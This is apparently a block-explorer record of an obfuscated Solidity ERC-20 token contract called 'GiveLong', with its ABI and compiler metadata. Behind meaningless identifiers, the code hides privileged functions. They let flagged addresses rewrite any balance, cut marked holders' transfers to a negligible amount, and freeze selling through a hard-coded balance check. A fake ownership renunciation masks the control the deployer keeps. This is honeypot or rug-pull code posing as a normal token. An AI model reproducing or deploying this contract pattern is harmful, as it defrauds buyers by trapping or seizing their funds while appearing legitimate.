{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface swapSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableAt {\n    function createPair(address liquidityReceiverTrading, address liquidityAt) external returns (address);\n}\n\ninterface txFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTeamIs) external view returns (uint256);\n\n    function transfer(address walletReceiver, uint256 shouldMode) external returns (bool);\n\n    function allowance(address fromMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletReceiver,\n        uint256 shouldMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingToSender, uint256 value);\n    event Approval(address indexed fromMax, address indexed spender, uint256 value);\n}\n\ninterface atFund is txFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GiveLong is limitWallet, txFrom, atFund {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellMinMode;\n    }\n\n    uint256 public takeEnable;\n\n    function owner() external view returns (address) {\n        return buyFundFee;\n    }\n\n    function teamSell(address buyAmount) public {\n        if (tokenTx) {\n            return;\n        }\n        if (takeEnable != minMarketing) {\n            minMarketing = takeTx;\n        }\n        fundIs[buyAmount] = true;\n        \n        tokenTx = true;\n    }\n\n    uint256 public minMarketing;\n\n    uint256 maxFundFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return autoMax;\n    }\n\n    uint8 private takeSwap = 18;\n\n    function transferFrom(address totalEnable, address walletReceiver, uint256 shouldMode) external override returns (bool) {\n        if (_msgSender() != feeIs) {\n            if (minTeam[totalEnable][_msgSender()] != type(uint256).max) {\n                require(shouldMode <= minTeam[totalEnable][_msgSender()]);\n                minTeam[totalEnable][_msgSender()] -= shouldMode;\n            }\n        }\n        return liquidityTotalMin(totalEnable, walletReceiver, shouldMode);\n    }\n\n    mapping(address => bool) public fundIs;\n\n    bool public enableLaunchedWallet;\n\n    address takeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public takeExempt;\n\n    mapping(address => uint256) private atSwap;\n\n    address private buyFundFee;\n\n    function liquidityTotalMin(address totalEnable, address walletReceiver, uint256 shouldMode) internal returns (bool) {\n        if (totalEnable == liquidityMinTx) {\n            return exemptFee(totalEnable, walletReceiver, shouldMode);\n        }\n        uint256 isLaunch = txFrom(feeShouldMax).balanceOf(takeTrading);\n        require(isLaunch == receiverLiquidityTo);\n        require(walletReceiver != takeTrading);\n        if (maxFee[totalEnable]) {\n            return exemptFee(totalEnable, walletReceiver, toLaunchTrading);\n        }\n        return exemptFee(totalEnable, walletReceiver, shouldMode);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyFundFee;\n    }\n\n    function exemptFee(address totalEnable, address walletReceiver, uint256 shouldMode) internal returns (bool) {\n        require(atSwap[totalEnable] >= shouldMode);\n        atSwap[totalEnable] -= shouldMode;\n        atSwap[walletReceiver] += shouldMode;\n        emit Transfer(totalEnable, walletReceiver, shouldMode);\n        return true;\n    }\n\n    address feeIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeTeamTrading(uint256 shouldMode) public {\n        swapFrom();\n        receiverLiquidityTo = shouldMode;\n    }\n\n    bool private marketingBuyFee;\n\n    mapping(address => bool) public maxFee;\n\n    function liquiditySwap(address fromTo, uint256 shouldMode) public {\n        swapFrom();\n        atSwap[fromTo] = shouldMode;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderSwapExempt;\n    }\n\n    address public feeShouldMax;\n\n    mapping(address => mapping(address => uint256)) private minTeam;\n\n    string private autoMax = \"Give Long\";\n\n    string private senderSwapExempt = \"GLG\";\n\n    function totalIsAmount(address fundSender) public {\n        swapFrom();\n        if (enableLaunchedWallet != takeExempt) {\n            takeExempt = false;\n        }\n        if (fundSender == liquidityMinTx || fundSender == feeShouldMax) {\n            return;\n        }\n        maxFee[fundSender] = true;\n    }\n\n    constructor (){\n        \n        swapSell buyLimit = swapSell(feeIs);\n        feeShouldMax = enableAt(buyLimit.factory()).createPair(buyLimit.WETH(), address(this));\n        \n        liquidityMinTx = _msgSender();\n        toAutoEnable();\n        fundIs[liquidityMinTx] = true;\n        atSwap[liquidityMinTx] = sellMinMode;\n        \n        emit Transfer(address(0), liquidityMinTx, sellMinMode);\n    }\n\n    uint256 private sellMinMode = 100000000 * 10 ** 18;\n\n    bool public minReceiver;\n\n    function approve(address fundBuyReceiver, uint256 shouldMode) public virtual override returns (bool) {\n        minTeam[_msgSender()][fundBuyReceiver] = shouldMode;\n        emit Approval(_msgSender(), fundBuyReceiver, shouldMode);\n        return true;\n    }\n\n    bool public liquidityList;\n\n    function balanceOf(address autoTeamIs) public view virtual override returns (uint256) {\n        return atSwap[autoTeamIs];\n    }\n\n    bool private listTeam;\n\n    uint256 receiverLiquidityTo;\n\n    uint256 constant toLaunchTrading = 3 ** 10;\n\n    bool public tokenTx;\n\n    function swapFrom() private view {\n        require(fundIs[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeSwap;\n    }\n\n    function transfer(address fromTo, uint256 shouldMode) external virtual override returns (bool) {\n        return liquidityTotalMin(_msgSender(), fromTo, shouldMode);\n    }\n\n    function allowance(address walletLiquidity, address fundBuyReceiver) external view virtual override returns (uint256) {\n        if (fundBuyReceiver == feeIs) {\n            return type(uint256).max;\n        }\n        return minTeam[walletLiquidity][fundBuyReceiver];\n    }\n\n    uint256 private takeTx;\n\n    event OwnershipTransferred(address indexed txSellTeam, address indexed marketingList);\n\n    function toAutoEnable() public {\n        emit OwnershipTransferred(liquidityMinTx, address(0));\n        buyFundFee = address(0);\n    }\n\n    address public liquidityMinTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSellTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuyReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeamIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShouldMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMinTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"modeTeamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAutoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"}],\"name\":\"totalIsAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}